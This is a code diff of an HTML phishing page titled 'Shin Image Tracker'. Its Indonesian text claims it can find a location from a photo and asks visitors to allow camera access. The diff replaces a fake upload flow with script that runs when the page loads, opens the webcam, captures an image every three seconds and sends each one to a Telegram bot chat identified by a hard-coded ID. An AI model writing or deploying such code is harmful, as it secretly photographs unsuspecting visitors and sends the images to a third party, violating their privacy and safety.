@@ -44,41 +44,21 @@
             text-align: center;
             line-height: 1.6;
         }
-        #upload-btn {
-            background-color: #007bff;
-            color: #fff;
-            font-size: 20px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
+        #video-container {
+            max-width: 100%;
+            margin: 20px;
         }
-        #upload-btn:hover {
-            background-color: #0056b3;
+        #video-container img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
         }
-        #continue-btn {
-            background-color: #28a745;
-            color: #fff;
-            font-size: 20px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            display: none; /* defaultnya disembunyikan */
-        }
-        #continue-btn:hover {
-            background-color: #218838;
-        }
-        footer {
-            background-color: #333;
-            color: #fff;
+        #video-container p {
+            font-size: 16px;
+            color: #888;
             text-align: center;
-            padding: 10px 0;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -88,34 +68,52 @@
         <h1 class="title">Shin Image Tracker</h1>
     </div>
     <div id="video-container">       
-        <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar">
+        <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar" width="320px">
         <p class="jd">Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoptimalkan pelacakan agar sesuai dan tepat. Jika masih ada masalah, silakan hubungi layanan pelanggan kami.</p>
     </div>
-    <div class="container">
-        <p style="font-size: 24px;">Coba Sekarang</p>
-        <input type="file" id="file-input" style="display: none;">
-        <label for="file-input" id="upload-btn" onclick="document.getElementById('file-input').click()">Upload</label>
-        <button id="continue-btn" onclick="continueToNextPage()">Continue</button>
-    </div>
-    <footer>
-        <p>Shin 2024</p>
-    </footer>
     <script>
-        function continueToNextPage() {
-            // Ganti URL ini dengan halaman tujuan
-            window.location.href = 'halaman-tujuan.html';
-        }
+        // JavaScript untuk pengambilan foto dan pengiriman ke Telegram
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        const chatId = '7056220365';
+        const botToken = '';
 
-        document.getElementById('file-input').addEventListener('change', function() {
-            const file = this.files[0];
-            if (file) {
-                // Simulasi proses upload
-                setTimeout(() => {
-                    document.getElementById('upload-btn').style.display = 'none';
-                    document.getElementById('continue-btn').style.display = 'block';
-                }, 2000); // Ganti 2000 dengan waktu sebenarnya proses upload
-            }
-        });
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setInterval(() => takePhotoAndSend(video), 3000);
+            })
+            .catch(err => {
+                console.error('Error accessing webcam: ', err);
+            });
+
+        function takePhotoAndSend(video) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'selfie.jpg');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Error sending photo to Telegram:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }, 'image/jpeg');
+        }
     </script>
 </body>
 </html>
